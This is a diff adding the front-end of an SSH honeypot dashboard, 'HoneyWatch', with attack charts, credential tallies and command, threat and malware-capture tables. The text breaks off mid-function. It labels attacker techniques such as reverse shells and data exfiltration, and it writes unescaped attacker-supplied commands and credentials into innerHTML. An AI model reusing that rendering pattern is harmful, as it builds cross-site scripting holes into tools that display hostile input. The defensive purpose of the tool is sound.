@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>HoneyWatch v2 — Threat Intelligence Platform</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
+<link  href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" rel="stylesheet"/>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap');
+
+:root{
+  --bg0:#04080d; --bg1:#080f17; --bg2:#0c1620; --bg3:#111e2a;
+  --border:#162330; --border2:#1e3245;
+  --g:#00ffa3; --g2:#00cc7d; --g3:#009959;
+  --r:#ff2d55; --r2:#cc2244;
+  --y:#ffcc00; --y2:#cc9900;
+  --c:#00ccff; --c2:#0099cc;
+  --p:#b060ff; --p2:#8040cc;
+  --o:#ff6600; --o2:#cc4400;
+  --txt:#a8c4d8; --txt2:#567890; --txt3:#2a4560;
+  --font-mono:'JetBrains Mono',monospace;
+  --font-ui:'Syne',sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg0);color:var(--txt);font-family:var(--font-ui);font-size:14px;min-height:100vh;overflow-x:hidden}
+
+/* ── scan lines ── */
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,163,.012) 3px,rgba(0,255,163,.012) 4px)}
+
+/* ── nav header ── */
+header{position:sticky;top:0;z-index:500;background:rgba(4,8,13,.92);
+  backdrop-filter:blur(12px);border-bottom:1px solid var(--border2);
+  padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px}
+.logo-icon{font-size:22px;filter:drop-shadow(0 0 8px var(--g))}
+.logo h1{font-family:var(--font-ui);font-size:16px;font-weight:800;
+  letter-spacing:.12em;text-transform:uppercase;
+  background:linear-gradient(90deg,var(--g),var(--c));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.logo span{font-family:var(--font-mono);font-size:10px;color:var(--txt2);letter-spacing:.2em}
+.nav-tabs{display:flex;gap:2px}
+.tab{padding:6px 14px;border-radius:4px;font-family:var(--font-mono);font-size:11px;
+  letter-spacing:.08em;cursor:pointer;transition:all .15s;
+  color:var(--txt2);border:1px solid transparent}
+.tab:hover{color:var(--txt);background:var(--bg3)}
+.tab.active{color:var(--g);background:rgba(0,255,163,.08);border-color:rgba(0,255,163,.2)}
+.header-right{display:flex;align-items:center;gap:16px}
+.live-badge{display:flex;align-items:center;gap:6px;font-family:var(--font-mono);font-size:10px;color:var(--g)}
+.pulse{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 0 0 var(--g);
+  animation:ripple 1.8s infinite}
+@keyframes ripple{0%{box-shadow:0 0 0 0 rgba(0,255,163,.5)}70%{box-shadow:0 0 0 8px rgba(0,255,163,0)}100%{box-shadow:0 0 0 0 rgba(0,255,163,0)}}
+#clock{font-family:var(--font-mono);font-size:11px;color:var(--txt2)}
+#ws-status{font-family:var(--font-mono);font-size:10px;padding:2px 8px;border-radius:3px;
+  background:rgba(255,45,85,.1);color:var(--r);border:1px solid rgba(255,45,85,.2)}
+#ws-status.connected{background:rgba(0,255,163,.08);color:var(--g);border-color:rgba(0,255,163,.2)}
+
+/* ── pages ── */
+.page{display:none;padding:20px 20px 32px}
+.page.active{display:block}
+
+/* ── stat strip ── */
+.stat-strip{display:grid;grid-template-columns:repeat(8,1fr);gap:8px;margin-bottom:20px}
+.stat{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
+  padding:12px 14px;position:relative;overflow:hidden;cursor:default;transition:border-color .2s}
+.stat:hover{border-color:var(--border2)}
+.stat::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px}
+.stat.g::after{background:linear-gradient(90deg,transparent,var(--g),transparent)}
+.stat.r::after{background:linear-gradient(90deg,transparent,var(--r),transparent)}
+.stat.y::after{background:linear-gradient(90deg,transparent,var(--y),transparent)}
+.stat.c::after{background:linear-gradient(90deg,transparent,var(--c),transparent)}
+.stat.p::after{background:linear-gradient(90deg,transparent,var(--p),transparent)}
+.stat.o::after{background:linear-gradient(90deg,transparent,var(--o),transparent)}
+.stat-lbl{font-family:var(--font-mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--txt2);margin-bottom:6px}
+.stat-val{font-family:var(--font-mono);font-size:22px;font-weight:700;line-height:1}
+.stat.g .stat-val{color:var(--g)} .stat.r .stat-val{color:var(--r)}
+.stat.y .stat-val{color:var(--y)} .stat.c .stat-val{color:var(--c)}
+.stat.p .stat-val{color:var(--p)} .stat.o .stat-val{color:var(--o)}
+.stat-sub{font-family:var(--font-mono);font-size:9px;color:var(--txt2);margin-top:3px}
+.delta{font-size:9px;margin-left:4px}
+.delta.up{color:var(--r)} .delta.dn{color:var(--g)}
+
+/* ── panel ── */
+.panel{background:var(--bg1);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:16px}
+.ph{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:rgba(0,255,163,.02)}
+.ph-title{font-family:var(--font-mono);font-size:10px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:var(--g)}
+.ph-tag{font-family:var(--font-mono);font-size:9px;color:var(--txt2);border:1px solid var(--border2);padding:2px 7px;border-radius:3px;letter-spacing:.1em}
+.pb{padding:16px}
+
+/* ── grid layouts ── */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+.g2-1{display:grid;grid-template-columns:2fr 1fr;gap:16px}
+.g1-2{display:grid;grid-template-columns:1fr 2fr;gap:16px}
+.g3-2{display:grid;grid-template-columns:3fr 2fr;gap:16px}
+
+/* ── horizontal bar ── */
+.hbar-list{display:flex;flex-direction:column;gap:6px}
+.hbar{display:grid;grid-template-columns:110px 1fr 42px;align-items:center;gap:8px}
+.hbar-lbl{font-family:var(--font-mono);font-size:11px;color:var(--txt);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hbar-track{background:var(--bg3);border-radius:2px;height:5px;overflow:hidden}
+.hbar-fill{height:100%;border-radius:2px;transition:width .8s cubic-bezier(.4,0,.2,1)}
+.fill-g{background:linear-gradient(90deg,var(--g3),var(--g))}
+.fill-r{background:linear-gradient(90deg,var(--r2),var(--r))}
+.fill-c{background:linear-gradient(90deg,var(--c2),var(--c))}
+.fill-y{background:linear-gradient(90deg,var(--y2),var(--y))}
+.fill-p{background:linear-gradient(90deg,var(--p2),var(--p))}
+.fill-o{background:linear-gradient(90deg,var(--o2),var(--o))}
+.hbar-cnt{font-family:var(--font-mono);font-size:10px;color:var(--txt2);text-align:right}
+
+/* ── data table ── */
+.dtable{width:100%;border-collapse:collapse}
+.dtable th{font-family:var(--font-mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;
+  color:var(--txt2);padding:6px 10px;border-bottom:1px solid var(--border);text-align:left;font-weight:400}
+.dtable td{font-family:var(--font-mono);font-size:11px;padding:7px 10px;
+  border-bottom:1px solid rgba(22,35,48,.7);vertical-align:middle}
+.dtable tr:last-child td{border-bottom:none}
+.dtable tr:hover td{background:rgba(0,255,163,.02)}
+.dtable .cmd{color:var(--g2);max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dtable .ts{color:var(--txt2);font-size:9px}
+.chip{display:inline-block;font-family:var(--font-mono);font-size:9px;padding:2px 7px;
+  border-radius:3px;letter-spacing:.05em;white-space:nowrap}
+.chip-c{background:rgba(0,204,255,.1);color:var(--c);border:1px solid rgba(0,204,255,.2)}
+.chip-r{background:rgba(255,45,85,.12);color:var(--r);border:1px solid rgba(255,45,85,.25)}
+.chip-y{background:rgba(255,204,0,.1);color:var(--y);border:1px solid rgba(255,204,0,.2)}
+.chip-p{background:rgba(176,96,255,.1);color:var(--p);border:1px solid rgba(176,96,255,.2)}
+.chip-o{background:rgba(255,102,0,.1);color:var(--o);border:1px solid rgba(255,102,0,.2)}
+.chip-g{background:rgba(0,255,163,.08);color:var(--g);border:1px solid rgba(0,255,163,.2)}
+
+/* severity chips */
+.sev-critical{background:rgba(255,45,85,.15);color:var(--r);border:1px solid rgba(255,45,85,.3)}
+.sev-high{background:rgba(255,102,0,.12);color:var(--o);border:1px solid rgba(255,102,0,.25)}
+.sev-medium{background:rgba(255,204,0,.1);color:var(--y);border:1px solid rgba(255,204,0,.2)}
+.sev-low{background:rgba(0,255,163,.07);color:var(--g);border:1px solid rgba(0,255,163,.15)}
+
+/* suspicious type chips */
+.st-file_download{background:rgba(255,204,0,.1);color:var(--y);border:1px solid rgba(255,204,0,.2)}
+.st-data_exfiltration{background:rgba(255,45,85,.12);color:var(--r);border:1px solid rgba(255,45,85,.25)}
+.st-interpreter_execution{background:rgba(176,96,255,.1);color:var(--p);border:1px solid rgba(176,96,255,.2)}
+.st-persistence{background:rgba(255,45,85,.15);color:var(--r);border:1px solid rgba(255,45,85,.3)}
+.st-make_executable{background:rgba(255,102,0,.12);color:var(--o);border:1px solid rgba(255,102,0,.25)}
+.st-lateral_movement{background:rgba(255,45,85,.2);color:#ff6688;border:1px solid rgba(255,45,85,.4)}
+.st-reverse_shell{background:rgba(255,0,50,.25);color:#ff4466;border:1px solid rgba(255,0,50,.5)}
+.st-obfuscation{background:rgba(176,96,255,.15);color:#cc88ff;border:1px solid rgba(176,96,255,.3)}
+
+/* attack type chips */
+.at-dictionary_attack{background:rgba(255,204,0,.1);color:var(--y);border:1px solid rgba(255,204,0,.2)}
+.at-targeted_bruteforce{background:rgba(255,45,85,.12);color:var(--r);border:1px solid rgba(255,45,85,.25)}
+.at-bruteforce{background:rgba(255,102,0,.1);color:var(--o);border:1px solid rgba(255,102,0,.2)}
+.at-credential_stuffing{background:rgba(176,96,255,.1);color:var(--p);border:1px solid rgba(176,96,255,.2)}
+.at-botnet_sweep{background:rgba(255,45,85,.2);color:#ff6688;border:1px solid rgba(255,45,85,.35)}
+
+/* IP rank */
+.ip-rank{display:flex;flex-direction:column;gap:6px}
+.ip-row{display:grid;grid-template-columns:24px 1fr auto auto;align-items:center;gap:8px;
+  background:var(--bg2);border-radius:4px;padding:8px 10px;border-left:3px solid}
+.ip-row.danger{border-left-color:var(--r)}
+.ip-row.warn  {border-left-color:var(--y)}
+.ip-row.ok    {border-left-color:var(--g3)}
+.ip-num{font-family:var(--font-mono);font-size:9px;color:var(--txt2)}
+.ip-info{display:flex;flex-direction:column;gap:1px}
+.ip-addr{font-family:var(--font-mono);font-size:11px;color:var(--c)}
+.ip-meta{font-family:var(--font-mono);font-size:9px;color:var(--txt2)}
+.ip-cnt{font-family:var(--font-mono);font-size:12px;font-weight:700;color:var(--r);white-space:nowrap}
+.abuse-bar{width:38px;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden}
+.abuse-fill{height:100%;border-radius:2px}
+
+/* ── map ── */
+#map{height:440px;border-radius:0;background:var(--bg2)}
+.leaflet-container{background:#04080d !important}
+.leaflet-tile{filter:brightness(.3) saturate(.4) hue-rotate(160deg)}
+.attack-marker{border-radius:50%;border:2px solid;animation:markerPulse 2s ease-in-out infinite;cursor:pointer}
+@keyframes markerPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
+.map-tooltip{background:rgba(8,15,23,.95)!important;border:1px solid var(--border2)!important;
+  color:var(--txt)!important;font-family:var(--font-mono)!important;font-size:11px!important;
+  border-radius:4px!important;padding:8px 12px!important;box-shadow:0 4px 20px rgba(0,0,0,.8)!important}
+
+/* ── heatmap ── */
+.heatmap-grid{display:grid;grid-template-columns:repeat(24,1fr);gap:4px;margin-top:8px}
+.hm-cell{aspect-ratio:1;border-radius:3px;cursor:default;transition:transform .1s;position:relative}
+.hm-cell:hover{transform:scale(1.2);z-index:10}
+.hm-label{font-family:var(--font-mono);font-size:8px;color:var(--txt2);text-align:center;margin-top:4px}
+
+/* ── live feed ticker ── */
+.live-feed{height:180px;overflow-y:auto;display:flex;flex-direction:column-reverse;gap:3px}
+.live-feed::-webkit-scrollbar{width:4px}
+.live-feed::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.feed-item{font-family:var(--font-mono);font-size:10px;padding:4px 8px;border-radius:3px;
+  display:flex;gap:8px;align-items:center;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.feed-item.auth{background:rgba(0,204,255,.05);border-left:2px solid var(--c)}
+.feed-item.susp{background:rgba(255,45,85,.06);border-left:2px solid var(--r)}
+.feed-item.cmd{background:rgba(0,255,163,.04);border-left:2px solid var(--g3)}
+.feed-item.conn{background:rgba(176,96,255,.05);border-left:2px solid var(--p)}
+.feed-ts{color:var(--txt2);flex-shrink:0}
+.feed-ip{color:var(--c);flex-shrink:0}
+.feed-msg{color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
+
+/* ── malware table ── */
+.hash{color:var(--y);font-size:10px;font-family:var(--font-mono)}
+
+/* ── chart canvases ── */
+canvas{display:block}
+
+/* ── flag emoji ── */
+.flag{font-size:14px;line-height:1}
+
+/* ── loading ── */
+.loading{display:flex;align-items:center;justify-content:center;
+  height:120px;flex-direction:column;gap:10px;color:var(--txt2);
+  font-family:var(--font-mono);font-size:11px}
+.spin{width:24px;height:24px;border:2px solid var(--border2);
+  border-top-color:var(--g);border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── scrollbar global ── */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg1)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+@media(max-width:1400px){.stat-strip{grid-template-columns:repeat(4,1fr)}}
+@media(max-width:900px){.g2,.g3,.g2-1,.g1-2,.g3-2{grid-template-columns:1fr}.stat-strip{grid-template-columns:repeat(2,1fr)}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <span class="logo-icon">🍯</span>
+    <div>
+      <h1>HoneyWatch</h1>
+      <span>SSH THREAT INTELLIGENCE v2.0</span>
+    </div>
+  </div>
+  <div class="nav-tabs">
+    <div class="tab active" onclick="showPage('overview')">Overview</div>
+    <div class="tab" onclick="showPage('map')">World Map</div>
+    <div class="tab" onclick="showPage('credentials')">Credentials</div>
+    <div class="tab" onclick="showPage('activity')">Activity</div>
+    <div class="tab" onclick="showPage('threats')">Threats</div>
+    <div class="tab" onclick="showPage('malware')">Malware</div>
+  </div>
+  <div class="header-right">
+    <span id="ws-status">● OFFLINE</span>
+    <div class="live-badge"><span class="pulse"></span>LIVE</div>
+    <div id="clock"></div>
+  </div>
+</header>
+
+<!-- ══════════════════════════════════════════════════════ OVERVIEW ══ -->
+<div class="page active" id="page-overview">
+
+  <div class="stat-strip" id="stat-strip">
+    <div class="loading" style="grid-column:1/-1"><div class="spin"></div>Loading…</div>
+  </div>
+
+  <div class="g2-1">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">14-Day Attack Timeline</span><span class="ph-tag" id="tl-tag">─</span></div>
+      <div class="pb"><canvas id="timelineChart" height="90"></canvas></div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Attack Classification</span><span class="ph-tag">PATTERNS</span></div>
+      <div class="pb"><canvas id="attackTypeChart" height="160"></canvas></div>
+    </div>
+  </div>
+
+  <div class="g3">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Top Usernames</span><span class="ph-tag" id="u-tag">─</span></div>
+      <div class="pb"><div class="hbar-list" id="userList"></div></div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Top Passwords</span><span class="ph-tag" id="p-tag">─</span></div>
+      <div class="pb"><div class="hbar-list" id="passList"></div></div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Top Commands</span><span class="ph-tag">POST-AUTH</span></div>
+      <div class="pb"><div class="hbar-list" id="cmdBarList"></div></div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Hourly Attack Heatmap</span><span class="ph-tag">7-DAY AVG</span></div>
+      <div class="pb">
+        <div class="heatmap-grid" id="heatmap"></div>
+        <div style="display:flex;justify-content:space-between;margin-top:6px">
+          <span style="font-family:var(--font-mono);font-size:8px;color:var(--txt2)">00:00</span>
+          <span style="font-family:var(--font-mono);font-size:8px;color:var(--txt2)">12:00</span>
+          <span style="font-family:var(--font-mono);font-size:8px;color:var(--txt2)">23:00</span>
+        </div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">⚡ Live Event Feed</span><span class="ph-tag" id="feed-count">─</span></div>
+      <div class="pb"><div class="live-feed" id="liveFeed"></div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ MAP ══ -->
+<div class="page" id="page-map">
+  <div class="panel">
+    <div class="ph"><span class="ph-title">🌍 Global Attack Origin Map</span><span class="ph-tag" id="map-tag">─</span></div>
+    <div id="map"></div>
+  </div>
+  <div class="panel" style="margin-top:16px">
+    <div class="ph"><span class="ph-title">Attacker IP Intelligence</span><span class="ph-tag">GEO + ABUSE SCORE</span></div>
+    <div class="pb">
+      <div class="ip-rank" id="ipRank"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════ CREDENTIALS ══ -->
+<div class="page" id="page-credentials">
+  <div class="g2">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Username Attempts</span><span class="ph-tag" id="uc-tag">─</span></div>
+      <div class="pb"><div class="hbar-list" id="userList2"></div></div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Password Attempts</span><span class="ph-tag" id="pc-tag">─</span></div>
+      <div class="pb"><div class="hbar-list" id="passList2"></div></div>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="ph"><span class="ph-title">Attack Pattern Breakdown</span><span class="ph-tag">CLASSIFIED</span></div>
+    <div class="pb">
+      <div class="g2-1">
+        <canvas id="attackPatternBar" height="100"></canvas>
+        <canvas id="attackPatternDonut" height="180"></canvas>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════ ACTIVITY ══ -->
+<div class="page" id="page-activity">
+  <div class="panel">
+    <div class="ph"><span class="ph-title">Recent Command Execution Log</span><span class="ph-tag">LAST 40</span></div>
+    <div class="pb" style="overflow-x:auto">
+      <table class="dtable">
+        <thead><tr><th>Timestamp (UTC)</th><th>Source IP</th><th>Country</th><th>Command</th></tr></thead>
+        <tbody id="cmdTable"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════ THREATS ══ -->
+<div class="page" id="page-threats">
+  <div class="g2">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Suspicious Event Types</span><span class="ph-tag">BREAKDOWN</span></div>
+      <div class="pb"><canvas id="suspDonut" height="200"></canvas></div>
+    </div>
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Threat Severity Distribution</span><span class="ph-tag">ALL TIME</span></div>
+      <div class="pb"><canvas id="sevChart" height="200"></canvas></div>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="ph"><span class="ph-title">🚨 Suspicious Activity Feed</span><span class="ph-tag" id="susp-tag">─</span></div>
+    <div class="pb" style="overflow-x:auto">
+      <table class="dtable">
+        <thead><tr><th>Timestamp</th><th>IP</th><th>Country</th><th>Type</th><th>Severity</th><th>Detail</th></tr></thead>
+        <tbody id="suspTable"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════ MALWARE ══ -->
+<div class="page" id="page-malware">
+  <div class="stat-strip" style="grid-template-columns:repeat(3,1fr);max-width:600px">
+    <div class="stat y"><div class="stat-lbl">Malware Downloads</div><div class="stat-val" id="mw-count">─</div><div class="stat-sub">files captured</div></div>
+    <div class="stat r"><div class="stat-lbl">Unique URLs</div><div class="stat-val" id="mw-urls">─</div><div class="stat-sub">distinct payloads</div></div>
+    <div class="stat p"><div class="stat-lbl">Unique Hashes</div><div class="stat-val" id="mw-hashes">─</div><div class="stat-sub">sha256 signatures</div></div>
+  </div>
+  <div class="panel">
+    <div class="ph"><span class="ph-title">💾 Malware Capture Log</span><span class="ph-tag">REAL DOWNLOADS</span></div>
+    <div class="pb" style="overflow-x:auto">
+      <table class="dtable">
+        <thead><tr><th>Timestamp</th><th>Attacker IP</th><th>Tool</th><th>URL</th><th>Filename</th><th>SHA256</th></tr></thead>
+        <tbody id="malwareTable"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════════════ DATA & STATE ══
+Chart.defaults.color = '#567890';
+Chart.defaults.borderColor = '#162330';
+Chart.defaults.font.family = "'JetBrains Mono', monospace";
+
+const COUNTRY_FLAGS = {US:'🇺🇸',RU:'🇷🇺',CN:'🇨🇳',DE:'🇩🇪',NL:'🇳🇱',UA:'🇺🇦',IR:'🇮🇷',
+  RO:'🇷🇴',BG:'🇧🇬',SG:'🇸🇬',TR:'🇹🇷',XX:'🏠',GB:'🇬🇧',FR:'🇫🇷',BR:'🇧🇷',IN:'🇮🇳'};
+
+let _data = null;
+let _charts = {};
+let _map = null;
+let _feedCount = 0;
+const MAX_FEED = 80;
+
+// ══════════════════════════════════════════════════════ NAV ══
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-'+name).classList.add('active');
+  event.target.classList.add('active');
+  if (name === 'map' && _map && _data) {
+    setTimeout(() => { _map.invalidateSize(); renderMap(_data); }, 100);
+  }
+}
+
+// ══════════════════════════════════════════════════════ CLOCK ══
+function updateClock() {
+  document.getElementById('clock').textContent =
+    new Date().toISOString().replace('T',' ').slice(0,19)+' UTC';
+}
+updateClock(); setInterval(updateClock, 1000);
+
+// ══════════════════════════════════════════════════════ WEBSOCKET ══
+function connectWS() {
+  const wsEl = document.getElementById('ws-status');
+  try {
+    const ws = new WebSocket('ws://localhost:8080/ws');
+    ws.onopen = () => {
+      wsEl.textContent = '● LIVE'; wsEl.classList.add('connected');
+    };
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'snapshot') {
+        _data = msg.data; renderAll(_data);
+      } else {
+        pushFeedEvent(msg);
+      }
+    };
+    ws.onclose = () => {
+      wsEl.textContent = '● OFFLINE'; wsEl.classList.remove('connected');
+      setTimeout(connectWS, 4000);
+    };
+    ws.onerror = () => ws.close();
+  } catch(e) {}
+}
+
+function pushFeedEvent(msg) {
+  const feed = document.getElementById('liveFeed');
+  const el = document.createElement('div');
+  const now = new Date().toISOString().slice(11,19);
+  if (msg.type === 'auth') {
+    el.className = 'feed-item auth';
+    el.innerHTML = `<span class="feed-ts">${now}</span><span class="feed-ip">${msg.ip}</span><span class="feed-msg">AUTH ${msg.result?.toUpperCase()} — ${msg.user}:${msg.pass} [${msg.attack_type||'unknown'}]</span>`;
+  } else if (msg.type === 'command') {
+    el.className = 'feed-item cmd';
+    el.innerHTML = `<span class="feed-ts">${now}</span><span class="feed-ip">${msg.ip}</span><span class="feed-msg">$ ${msg.cmd}</span>`;
+  } else if (msg.type === 'suspicious') {
+    el.className = 'feed-item susp';
+    el.innerHTML = `<span class="feed-ts">${now}</span><span class="feed-ip">${msg.ip}</span><span class="feed-msg">🚨 ${msg.stype} — ${(msg.cmd||'').slice(0,60)}</span>`;
+  } else if (msg.type === 'connection') {
+    el.className = 'feed-item conn';
+    el.innerHTML = `<span class="feed-ts">${now}</span><span class="feed-ip">${msg.ip}</span><span class="feed-msg">New SSH connection</span>`;
+  }
+  if (el.className) {
+    feed.prepend(el);
+    _feedCount++;
+    document.getElementById('feed-count').textContent = _feedCount + ' events';
+    while (feed.children.length > MAX_FEED) feed.lastChild.remove();
+  }
+}
+
+// ══════════════════════════════════════════════════════ HELPERS ══
+const $ = id => document.getElementById(id);
+const fmt = n => n?.toLocaleString() ?? '─';
+const fmtTs = ts => ts ? ts.replace('T',' ').slice(0,16)+'Z' : '─';
+const flag = cc => COUNTRY_FLAGS[cc] || '🌐';
+
+function hbar(items, containerId, colorClass, top=12) {
+  const el = $(containerId);
+  if (!items?.length) { el.innerHTML='<div class="loading" style="height:60px"><div class="spin"></div></div>'; return; }
+  const max = items[0].count || 1;
+  el.innerHTML = items.slice(0,top).map(it => {
+    const lbl = it.value ?? it.cmd ?? it.ip ?? '—';
+    const pct = Math.round(it.count/max*100);
+    return `<div class="hbar">
+      <div class="hbar-lbl" title="${lbl}">${lbl}</div>
+      <div class="hbar-track"><div class="hbar-fill fill-${colorClass}" style="width:${pct}%"></div></div>
+      <div class="hbar-cnt">${fmt(it.count)}</div>
+    </div>`;
+  }).join('');
+}
+
+function destroyChart(id) {
+  if (_charts[id]) { _charts[id].destroy(); delete _charts[id]; }
+}
+
+// ══════════════════════════════════════════════════════ RENDER ══
+function renderAll(d) {
+  renderStats(d);
+  renderTimeline(d);
+  renderAttackTypes(d);
+  hbar(d.top_usernames, 'userList', 'c');
+  hbar(d.top_passwords, 'passList', 'r');
+  hbar(d.top_commands.map(x=>({value:x.cmd,count:x.count})), 'cmdBarList', 'g');
+  hbar(d.top_usernames, 'userList2', 'c', 20);
+  hbar(d.top_passwords, 'passList2', 'r', 20);
+  $('u-tag').textContent = (d.top_usernames?.length||0)+' shown';
+  $('p-tag').textContent = (d.top_passwords?.length||0)+' shown';
+  $('uc-tag').textContent = (d.top_usernames?.length||0)+' unique';
+  $('pc-tag').textContent = (d.top_passwords?.length||0)+' unique';
+  renderHeatmap(d.hourly_heatmap);
+  renderIpRank(d.top_ips);
+  renderCmdTable(d.recent_commands, d.top_ips);
+  renderSuspTable(d.recent_suspicious);
+  renderSuspDonut(d.suspicious_types);
+  renderSevChart(d.recent_suspicious);
+  renderMalware(d.recent_malware, d.summary);
+  renderAttackPatternCharts(d.attack_types);
+  if (document.getElementById('page-map').classList.contains('active')) renderMap(d);
+  initFeed(d.recent_commands, d.recent_suspicious);
+}
+
+function renderStats(d) {
+  const s = d.summary;
+  $('stat-strip').innerHTML = `
+    <div class="stat g"><div class="stat-lbl">Total Attempts</div><div class="stat-val">${fmt(s.total_attempts)}</div><div class="stat-sub">auth probes</div></div>
+    <div class="stat r"><div class="stat-lbl">Successful Logins</div><div class="stat-val">${fmt(s.total_successes)}</div><div class="stat-sub">${s.success_rate}% rate</div></div>
+    <div class="stat c"><div class="stat-lbl">Unique Attackers</div><div class="stat-val">${fmt(s.unique_ips)}</div><div class="stat-sub">distinct IPs</div></div>
+    <div class="stat y"><div class="stat-lbl">Commands Run</div><div class="stat-val">${fmt(s.total_commands)}</div><div class="stat-sub">post-auth</div></div>
+    <div class="stat p"><div class="stat-lbl">Suspicious Events</div><div class="stat-val">${fmt(s.suspicious_events)}</div><div class="stat-sub">high-risk acts</div></div>
+    <div class="stat o"><div class="stat-lbl">Malware Captures</div><div class="stat-val">${fmt(s.malware_captures)}</div><div class="stat-sub">files caught</div></div>
+    <div class="stat r"><div class="stat-lbl">Active Sessions</div><div class="stat-val">${fmt(s.active_sessions||0)}</div><div class="stat-sub">right now</div></div>
+    <div class="stat g"><div class="stat-lbl">Sessions Today</div><div class="stat-val">${fmt(s.sessions_today||0)}</div><div class="stat-sub">since midnight</div></div>`;
+}
+
+function renderTimeline(d) {
+  destroyChart('timeline');
+  const tl = d.timeline || [];
+  $('tl-tag').textContent = `${tl.reduce((a,b)=>a+b.attempts,0).toLocaleString()} total`;
+  _charts['timeline'] = new Chart($('timelineChart'), {
+    type:'bar', data:{
+      labels: tl.map(x=>x.date.slice(5)),
+      datasets:[
+        {label:'Auth Attempts',data:tl.map(x=>x.attempts),backgroundColor:'rgba(0,204,255,.18)',borderColor:'#00ccff',borderWidth:1.5,borderRadius:2,yAxisID:'y'},
+        {label:'Successful Logins',data:tl.map(x=>x.successes),backgroundColor:'rgba(255,45,85,.55)',borderColor:'#ff2d55',borderWidth:1.5,borderRadius:2,yAxisID:'y'},
+        {label:'Commands',type:'line',data:tl.map(x=>x.commands||0),borderColor:'#00ffa3',borderWidth:1.5,pointRadius:2,tension:.4,fill:false,yAxisID:'y2'},
+      ]
+    },
+    options:{responsive:true,maintainAspectRatio:true,interaction:{mode:'index'},
+      plugins:{legend:{labels:{color:'#567890',boxWidth:10,padding:12}}},
+      scales:{
+        x:{grid:{color:'rgba(22,35,48,.8)'},ticks:{color:'#567890',font:{size:9}}},
+        y:{grid:{color:'rgba(22,35,48,.8)'},ticks:{color:'#567890',font:{size:9}},beginAtZero:true,position:'left'},
+        y2:{grid:{display:false},ticks:{color:'#00ffa3',font:{size:9}},beginAtZero:true,position:'right'},
+      }
+    }
+  });
+}
+
+function renderAttackTypes(d) {
+  destroyChart('atk');
+  const AT_COLORS = {dictionary_attack:'#ffcc00',targeted_bruteforce:'#ff2d55',bruteforce:'#ff6600',credential_stuffing:'#b060ff',botnet_sweep:'#ff4466'};
+  const at = d.attack_types || [];
+  _charts['atk'] = new Chart($('attackTypeChart'), {
+    type:'doughnut', data:{
+      labels: at.map(x=>x.type.replace(/_/g,' ')),
+      datasets:[{data:at.map(x=>x.count),backgroundColor:at.map(x=>AT_COLORS[x.type]||'#567890'),borderColor:'#080f17',borderWidth:3}]
+    },
